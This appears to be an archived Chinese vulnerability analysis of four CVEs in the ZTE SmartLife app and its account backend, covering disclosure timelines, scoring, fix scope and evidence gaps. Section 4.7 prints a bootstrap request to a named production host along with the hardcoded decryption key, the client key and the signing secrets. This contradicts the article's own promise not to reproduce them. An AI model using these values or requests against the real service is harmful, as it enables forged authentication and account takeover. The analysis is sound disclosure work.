---
cve: "CVE-2026-86552"
source: "gelusus/wxvl 公众号漏洞文库"
id: "vw-d493880cf67bc08c2ed5d573"
entity_id: "ve-d493880cf67bc08c2ed5d573"
schema_version: "1"
title: "中兴 SmartLife 账户流程与客户端密钥问题（四项 CVE）"
product: "ZTE SmartLife Android应用与账户后端"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2026-86552; CVE-2026-86553; CVE-2026-86554; CVE-2026-86555"
referenced_identifiers: ""
prerequisites: "ZTE_SL_V2.8.2_ABROAD及更早，测试2.8.1；2.8.4上架不等于四漏洞后端全部修复，iOS未实证"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E4%B8%AD%E5%85%B4SmartLife/%E4%B8%AD%E5%85%B4SmartLife%E5%AE%89%E5%8D%93%E5%BA%94%E7%94%A8%E7%9A%844%E4%B8%AACVE%E6%BC%8F%E6%B4%9E%E7%9B%B4%E8%87%B3%E8%B4%A6%E6%88%B7%E6%8E%A5%E7%AE%A1.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

# 中兴 SmartLife 账户流程与客户端密钥问题（四项 CVE）

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：ZTE SmartLife Android应用与账户后端
- 本文讨论：CVE-2026-86552/86553/86554/86555
- 版本、权限与配置前提：ZTE_SL_V2.8.2_ABROAD及更早，测试2.8.1；2.8.4上架不等于四漏洞后端全部修复，iOS未实证
- 资料类型：四CVE长篇研究及证据分层；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 前文多次声明不转载可能仍有效的密钥，4.7却包含完整客户端共享/签名材料及账户重置请求，发布卫生自相矛盾；本审阅不复制这些值
- 将四漏洞统一归入用户鉴权层，与86555客户端硬编码根因不一致
- 声称新版本已移除密钥缺少APK差异证据；附录带未转义嵌套引号/注释的JSON应标伪代码
- 主CVE元数据只列86552，漏另三个主实体
- 已落实的文本修订：HTTP 报文围栏改为 http；标题与正文证据对齐。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- 客户端解密密钥、对称密钥和共享签名材料是否已被厂商轮换尚未核验。

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 四CNA描述、原始自有账户测试证据和二进制补丁差异待核；测试环境删除端点不能算第五个生产漏洞
- 文章自称核验不代表本审阅独立验证；KEV缺席不代表无在野利用
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->

 Ots安全   2026-09-22 05:14  
  
**威胁简报**  
  
  
**恶意软件**  
  
  
**漏洞攻击**  
  
2026 年 9 月 20 日 09 时 15 分（UTC），中兴通讯在自己维护的 PSIRT 门户上发布了这批公告里最晚的一条编号记录。同一天的 19 时 12 分，一份带可执行脚本和完整密钥参数表的 PoC 仓库出现在 GitHub 上，两个时刻相隔 9 小时 57 分。  
  
这批公告一共四条编号，CVE-2026-86552 至 CVE-2026-86555，指向中兴 SmartLife 移动应用与其背后的账号后端，其中评分最高的一条是密码重置问题。按厂商在编号记录里的原文，攻击者拿到应用认证参数之后可以直接调用验证接口取得注册邮箱对应的真实账号 ID，再伪造应用认证信息并带上目标账号 ID 重置该账号的密码，报告人随后用新密码登录并取得了有效会话。  
  
这是本系列遇到的第十种源结构：厂商自己担任编号分配机构（CNA），PoC 完整公开，而修复同时落在客户端包与服务端后端，两边都没有可供逐行比对的补丁。这类素材的核查重点不在于机制能不能还原，而在于把可核与不可核逐项分开，尤其是把发布决定所依赖的那句声明单独拎出来查。  
## 一、先看问题：四个编号与一次同日修订  
### 1.1 编号体系与厂商自任 CNA  
  
四条记录的分配机构字段都是 zte  
，机构标识 6786b568，含义是这批编号由厂商自己受理、自己评分、自己发布，MITRE 侧只做登记。这不影响编号的有效性，但决定了一件事：**围绕这些漏洞的每一句官方表述，来源只有一个。**  
 第三方能独立复核的只有厂商写下的文字，不能复核这些文字背后的判断过程。  
  
四条记录的预留时间都落在 2026-09-08 02:55:56.712，四者处于同一毫秒，说明这批编号是一次性申请下来的，申请日期在厂商称「已完全修复」之后五天。  
### 1.2 四条评分与弱点编号  
<table><thead><tr style="box-sizing: border-box;"><th data-colwidth="166" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">编号</span></section></th><th data-colwidth="232" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">标题</span></section></th><th data-colwidth="92" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">评分</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;"><td data-colwidth="166" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">CVE-2026-86552</span></section></td><td data-colwidth="232" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">注册流程跳过邮箱归属验证</span></section></td><td data-colwidth="92" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">5.4 中危</span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="166" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">CVE-2026-86553</span></section></td><td data-colwidth="232" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">密码重置问题</span></section></td><td data-colwidth="92" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">8.8 高危</span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="166" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">CVE-2026-86554</span></section></td><td data-colwidth="232" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">邮箱枚举与账号 ID 泄漏</span></section></td><td data-colwidth="92" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">4.3 中危</span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="166" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">CVE-2026-86555</span></section></td><td data-colwidth="232" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">硬编码密钥</span></section></td><td data-colwidth="92" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">6.2 中危</span></section></td></tr></tbody></table>  
四条评分都是纯基础评分，四条向量里都没有时间维度与环境维度分量，也就是说厂商没有对可利用性成熟度作出判定。  
  
四点观察值得写下来作为后文的索引。三条账号类问题共用同一个弱点编号 CWE-269，即权限管理不当，这是一个父类编号。这三个问题分别涉及恢复机制缺少校验、账号标识可枚举、注册流程未验证邮箱归属，投到恢复机制类或信息暴露类的弱点更贴近具体缺陷。  
  
本文不裁定映射对错，但要指出后果：自查表按弱点编号分派，父类编号会把三类不同的代码修改并成一类。硬编码密钥那条用 CWE-798（使用硬编码凭据），这一条准确。四条记录的影响清单里都挂了 CAPEC-115（认证绕过），而对硬编码密钥那一条来说，认证绕过属于下游结果而不是该缺陷本身，它自己只直接影响机密性。NVD 侧状态全部是 Received，意味着 NVD 还没有给出自己的分析结论。  
  
四条评分都是 CNA 提供的次级来源评分，NVD 侧末次更新是 2026-09-21 19 时 17 分。  
### 1.3 时间线与窗口期  
<table><thead><tr style="box-sizing: border-box;"><th data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">时间</span></section></th><th data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-05-18</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">技术报告经邮件正文提交厂商 PSIRT，含五个问题与请求示例</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-06-01</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">厂商要求改用官方模板，当日提交</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-06-12</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">附件投递失败后重发，厂商确认收到</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-07-16</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">按厂商要求补交应用认证重建细节与逐项证明</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-08-12</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">厂商确认发现并提供 CVSS 向量</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-08-19</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2.8.4 上架 Google Play</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-08-21</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2.8.4 上架 App Store</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-09-03</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">厂商称已完全修复</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-09-08</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">四条编号的预留时间，四者落在同一毫秒</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-09-20</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">四条编号陆续发布</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-09-20</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">PoC 仓库创建</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-09-21</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">CISA 侧富化写入</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-09-21</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">NVD 侧末次更新</span></span></section></td></tr></tbody></table>  
窗口期算出来是五段。报告到首个修复包上架 93 天，报告到厂商称已修复 108 天，报告到编号发布 125 天。编号预留到发布 12 天，**编号末条发布到 PoC 公开 9 小时 57 分。**  
 前四段的时间点只有一个来源即报告人自述，第五段的两个端点分别来自 CVE 记录与仓库接口元数据，可以独立复核。需要一并注明的是，报告人称整个协调过程一共往来了 50 封邮件，这个数字同样只有单来源。  
### 1.4 在野状态的三层写法  
  
厂商侧的四条记录里都没有在野利用的表述，exploited  
 字段并不出现。CISA 已知被利用漏洞目录（KEV）未收录这四条编号，顺带核实的一个事实是在 2026-09-21 版本的 KEV 全量目录里，厂商项目字段为 ZTE 的记录是零条。CISA 侧漏洞富化在 2026-09-21 18 时 05 分至 18 时 10 分写入。四条全部标 Exploitation: none  
 与 Automatable: no  
，技术影响一条标 total、三条标 partial。  
  
这三者不冲突，但不能合并成一句话。需要指出的是富化写入的时间戳晚于 PoC 公开约 23 小时，也就是说这份判定是在完整 PoC 已经躺在公开仓库里之后写下的。该字段对「PoC 已公开」这一情形的取值口径，公开信息未说明，本条只作观察记录，不作结论。  
  
EPSS 方面，86553 为 0.00446，百分位 0.38035，取值日期 2026-09-21，取自 FIRST 公开接口，四条均低于 0.5%。EPSS 衡量的是未来 30 天被利用概率的估计值，不是严重性指标，与 CVSS 并列看而不混读。  
## 二、影响范围：版本号、修复层与分发渠道  
### 2.1 客户端版本号是不是修复判据  
  
四条记录的受影响字段写的是 ZTE_SL_V2.8.2_ABROAD and prior versions  
，86555 一条则写作 and earlier versions。两者含义相同而写法不同，可以反推出四条记录在撰写时并非共用同一段文本。  
  
**修复版本在编号记录里是空的。**  
 有聚合站给出 ZTE_SL_V2.8.4_ABROAD  
 为修复版本。我核了四条 CNA 容器的全部字段，里面没有修复版本字段，也没有 datePublic 与 timeline，因此这个值只有聚合站一个来源。  
  
应用商店侧的公开数据是这样的。Google Play 当前版本 2.8.4，更新日期 2026 年 8 月 19 日，版本说明只有一句 Fixed known issues。App Store 版本历史显示 2.8.4 发布于 2026 年 8 月 21 日，说明文字是 Resolve existing issues。两处与「修复版本为 2.8.4」的说法自洽。  
  
这条推理的方向要注意。商店的上架时间只能证明 2.8.4 何时可用，不能证明厂商以它为修复边界。按修复版本倒推，2.8.3 位于受影响的 2.8.2 之后、修复的 2.8.4 之前，其状态在四条记录里没有任何说明。**自查时不要把「我在 2.8.3」当作已修复的依据。**  
### 2.2 修复落在客户端还是服务端  
  
三个账号类问题，枚举、重置、注册跳过验证，都发生在后端接口上，修复只能落在服务端；硬编码密钥那条在客户端包里，修复需要一个新版本。**四条编号的修复不是一个动作。**  
  
用户能升级应用，但升级不了服务端，而服务端是否已修，用户从应用商店的信息里读不出来。这一点还能从处置指引的落差上看出来。厂商公告侧给出的路径指向其全球客户支持中心，应用商店的版本说明里不含任何安全字样。两个渠道给出的「该怎么办」并不一致，而两边都不回答「你的服务端是否已修复」这个问题。  
### 2.3 两条分发渠道的版本时间  
<table><thead><tr><th data-colwidth="208" style="border:1px solid #c9c9c9;padding:6px 12px;background:#f2f2f2;font-weight:600;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">渠道</span></span></section></th><th data-colwidth="166" style="border:1px solid #c9c9c9;padding:6px 12px;background:#f2f2f2;font-weight:600;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">版本</span></span></section></th><th data-colwidth="129" style="border:1px solid #c9c9c9;padding:6px 12px;background:#f2f2f2;font-weight:600;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">上架日期</span></span></section></th></tr></thead><tbody><tr><td data-colwidth="208" style="border:1px solid #c9c9c9;padding:6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">Google Play</span></span></section></td><td data-colwidth="166" style="border:1px solid #c9c9c9;padding:6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2.8.4</span></span></section></td><td data-colwidth="129" style="border:1px solid #c9c9c9;padding:6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-08-19</span></span></section></td></tr><tr><td data-colwidth="208" style="border:1px solid #c9c9c9;padding:6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">App Store</span></span></section></td><td data-colwidth="166" style="border:1px solid #c9c9c9;padding:6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2.8.4</span></span></section></td><td data-colwidth="129" style="border:1px solid #c9c9c9;padding:6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-08-21</span></span></section></td></tr></tbody></table>  
两条渠道相隔两天，都落在厂商称「已完全修复」的 2026-09-03 之前，顺序是修复包先上架、厂商后确认修复完成、编号再晚 17 天发布。  
### 2.4 平台边界在编号记录里是空的  
  
受影响字段用的是跨平台的版本串 ZTE_SL_V2.8.2_ABROAD  
，没有区分 Android 与 iOS。而报告人的客户端取证对象只有一个，即 Android 包 com.zte.smarthome.abroad  
 2.8.1。iOS 客户端是否也以同样方式从公开引导接口派生应用认证材料，公开信息未说明，自查时不要因为编号串不区分平台就假定两端行为一致。  
### 2.5 版本表述与修复版本之间的空档  
  
能确认的是「2.8.2 及更早受影响」这一句，它出自厂商；「2.8.4 是修复边界」出自聚合站。这两句不要拼成一句当成官方结论，因为中间那段空档在编号记录里没有对应的文字。  
## 三、原因导致：两层信任被折成一层  
### 3.1 应用身份与应用签名的构造位置  
  
账号接口要求五个固定请求头，分别是应用标识、租户标识、接入密钥、语言标识，以及一个由共享密钥与当前毫秒时间戳加密得到的动态值。前四个是静态值，第五个由客户端在运行时现算，服务端据此判断请求来自官方应用。  
  
动态值所需的共享密钥与接入密钥来自何处，报告人给出的路径是这样的。应用启动后请求一个公开的引导接口，接口返回一段密文。客户端用写在 APK 里的解密密钥把它解开，得到服务器地址、客户端对称密钥、共享密钥与接入密钥。这一段是整条链的入口，也是编号 86555 的落点，它的性质是一个服务端配置分发接口，不校验调用者身份，也不要求登录。  
### 3.2 账号操作缺的是哪一层校验  
  
把两件事分开看：第一层是应用身份，服务端要确认请求来自 SmartLife 应用；第二层是用户授权，服务端要确认调用者控制了被操作的那个账号。**四条编号的问题全部出在第二层。**  
  
枚举是只要知道邮箱就能问出账号是否存在以及后端标识，重置是拿到后端标识就能改密码，注册是未验邮箱归属就能完成。第一层本身没有被攻破，它只是被公开材料完整地绕开了，因为解开它所需要的钥匙就写在客户端里。把客户端密钥的暴露当成一次移动端逆向问题是一种常见的降级读法，这里的入口问题不构成影响，影响在于后端把应用身份当成了账号授权的替代品。  
### 3.3 厂商描述与研究者主张的分歧点  
  
研究者写下的根因是重置路径根本没有要求重置验证码，缺失的那一步校验就是缺陷本身。厂商在编号记录里的原文是，攻击者拿到应用认证参数后可以直接调用验证接口取得注册邮箱对应的真实账号 ID，再通过伪造应用认证信息加目标账号 ID 重置目标账号密码。  
  
对照下来，厂商描述了「怎么做到」，没有说「少了哪一步」，**「缺少重置验证码校验」这一根因主张只有研究者一个来源。**  
 这一点在自查里很关键，因为它决定排查范围：按厂商描述读，这是一次身份伪造加接口滥用，要看的是签名校验与接口权限；按研究者主张读，这是一处缺失的流程校验，要看的是密码重置流程的状态机。两者指向不同的检查项。  
  
另需注明一段文字。聚合站页面上有一段以 Solution 为标题的处置建议，内容包含对密码重置功能实施限速等五条。而我核了四条 CNA 容器的字段清单，里面没有 solutions 字段。该段文字的归属，公开信息未说明，不得读成厂商的根因认定。  
### 3.4 公开引导接口为什么是可用的  
  
引导接口托管在一个公开域名上，接收客户端标识与区域参数，返回一段密文，不需要任何账号，也不需要登录。它的设计意图可以理解：客户端首次运行时要拿到服务器地址与密钥材料，服务端于是把这些配置发给任何来问的调用者。  
  
问题在于返回的材料里包含了在后续请求中充当签名凭据的共享密钥，而解开这段密文的钥匙就写在客户端里。把服务端配置发给未认证的客户端，等于把配置里的秘密也发给未认证的调用者，客户端写死的解密密钥只抬高了几分钟的静态分析成本。  
## 四、漏洞触发：从引导接口到有效会话  
### 4.1 四步链与每一步的可核程度  
<table><thead><tr style="box-sizing: border-box;"><th data-colwidth="58" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">步骤</span></section></th><th style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">动作</span></section></th><th style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">可核程度</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;"><td data-colwidth="58" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">1</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">取得应用认证上下文</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">机制可核，端到端复现不可核</span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="58" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">2</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">询问账号是否存在并取得后端标识</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">返回码口径仅单来源</span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="58" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">3</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">用目标账号标识改密码</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">返回码口径仅单来源</span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="58" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">4</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">用新密码登录并取得会话</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">后置条件仅单来源</span></section></td></tr></tbody></table>  
四条厂商描述逐字确认了接口路径与顺序。/account/verify.serv  
、/account/person/signup.serv  
、/account/password/reset.serv  
、/account/delete.serv  
、/auth/login.serv  
 都出现在厂商原文里。**接口名与调用顺序是可核的**  
，返回码对照与账号后置条件则只有报告人一个来源。  
  
报告人给出的返回码对照是未注册邮箱返回 0004、已注册邮箱返回 0000 并附带后端账号标识；第 4 步的对照是旧密码被拒、新密码返回会话。这些数值在公开材料里没有第二份记录，它们构成文章结论的最薄一层支撑。  
### 4.2 唯一被厂商排除的那一步  
  
删除接口在报告人早期选到的环境上无需用户令牌即可删除账号，厂商称该行为仅存在于测试环境、生产路径需要令牌，报告人接受了这一说明，四条编号不含这一项。报告人记录的负向复测正是在这个接口上，在现网主机上返回 3001，令牌校验失败。  
  
这一条被排除是合理的，但要注意它在整份材料里的位置：**这是全文唯一一处「修补之后的行为被复核过」的记录，而它落在被排除的那一项上。**  
 其余四项在材料里只有正向复现的记录，没有负向复核的记录，因此「现在还能不能走通」这个问题，公开材料没有给出答案。  
### 4.3 公开的密钥材料与它的失效边界  
  
报告人公开了四类密钥参数的完整值，理由是全部端点已修补且密钥材料已由厂商轮换，本文不复制这些值。失效边界要拆开说：客户端里的解密密钥与对称密钥随新版本移除，这一步可核；而请求签名所用的共享密钥与接入密钥属于服务端一侧，它们的失效依赖服务端轮换，外部只能通过一件事验证，就是拿旧材料重放请求看是否被拒。  
  
公开材料里没有这一步的重放记录。仓库的探针说明以现在时描述在现网主机上复现了枚举、重置、重置后登录与注册绕过四项，但没有给出探针的运行时间戳，因此无从判断这些记录产生于修补之前还是之后。  
  
能确认的只有材料已经公开这一事实，「材料已经失效」这一判断只有一个来源，而该来源的可核路径在公开材料里是空的。本文因此选择不转载这些值，理由不是对报告人的判断提出质疑，而是这条判断的可核路径缺失。一旦服务端并未轮换，复制它们等于在本号的一次转发里再分发一份可能仍然有效的凭据，而本号的运作方式正是转发。任何人拿到这份材料能不能再构造出可用的应用认证，公开信息未说明。  
### 4.4 编号之外还有一类密钥材料  
  
报告人在同一段说明里列出的第四项，是静态分析在 APK 中发现的相机双向 TLS 私钥，它位于 res/raw/smartlife_key  
。这份私钥与同目录下的客户端证书匹配，证书签发者为 ZTE-CAMERA-CA  
，用于摄像头与消息队列通信。这一项**不在四个编号里，也没有对应的厂商公告**  
，公开信息未说明厂商是否受理、是否轮换、是否认为它需要单独编号。  
  
把它与本篇主线并列观察，能看出一条边界：报告人对四项密钥材料作了一次性公开，而厂商只对其中三项给出了编号与评分。材料公开的范围大于编号覆盖的范围，这个差额落在哪里，读者需要自己知道。  
### 4.5 登录之后能摸到的面  
  
报告人从 APK 里列出的路由族分成四组。账号会话在 Homecare 软件开发包（SDK）中作为 bearer 凭据使用，同组请求还带一个标记调用方为 SmartLife 的字段。第一组是家庭、房间与已绑定设备清单；第二组是设备绑定与解绑、绑定状态查询、设备分享与取消分享、家庭成员接受；第三组是云到设备的消息转发与一键升级的发起和结果查询；第四组是摄像头、传感器、子用户、用户日志与安防设防相关接口。  
  
这一段的性质要说明白：**路由清单证明的是登录之后这扇门后面有多少东西，不证明这些接口本身存在缺陷。**  
 报告人明确把这一步标为静态分析所列出的可见面，而不是已经验证的缺陷。把账号会话写进一个能下发设备指令与固件升级动作的平面上，是这条链的后果放大器，账号接管在这个产品上不是一次资料修改，而是一次设备控制权的前置条件。  
### 4.6 报告方的两种验证方法各自证明了什么  
  
方法一是直放，用恢复出的应用认证上下文对报告人自己的对照账号跑一遍账号生命周期，落点是返回码与账号后置条件，它证明的是链路可以走通。方法二是 Frida 运行期观测，附着到官方客户端进程，记录它在运行期选中的后端主机以及进程内生成签名头的路径。它证明的是现网客户端确实在选这个后端并在本地算出签名，报告人称这一步的价值在于压缩了「你测的是测试环境」这类质疑空间。两种方法的运行环境是带 root 的 Android 12 模拟器，静态分析工具是 jadx，脚本语言是 PowerShell 7。  
  
两种方法互补，但都不能回答另一个问题，就是修补之后是否还能走通。两段证据把「机制成立」撑到了很高的强度，把「现已不可用」撑到了零。  
  
4.7 针对每个缺陷触发请求  
  
Bug 1. 通过公共引导程序伪造 SmartLife 应用身份验证  
  
```http
POST /api/getUacSignInfo HTTP/1.1
Host: ossx-smart.ztehome.com.cn:5443
Content-Type: application/json
 
{
  "clientid":"271950143414",
  "appDistrict":"DE"
}
 
// Decrypt result.data with static APK key (CVE-2026-86555):
decrypt(result.data, key="096760a7a99d99d12de9fecbfca568c0")
 
// Yields recovered UAC context:
// appClientKey: "djrom(&)(&)MORJD"
// appUacSec:    "b2cfe28732612cfd81de7a22ace2034317a47eb94683a016a85cc0883597c625"
// appUacItp:    "271950143414fnu4mb3lxxotfj5mi1tp"
 
derived account headers:
X-App-Id:    271950143414
X-Tenant-Id: 10001
X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
X-Auth-Value: aes_gcm_encrypt("${appUacSec},271950143414,${appUacItp},${ms}", key="djrom(&)(&)MORJD")
```  
  
> 弱点：公开的引导数据加上客户端提供的解密密钥，096760a7a99d99d12de9fecbfca568c0可以获取客户端密钥djrom(&)(&)MORJD和用于对到达帐户后端的请求进行签名的秘密材料（CVE-2026-86555）。  
  
  
漏洞 2：账户枚举和账户 ID 泄露  
  
```http
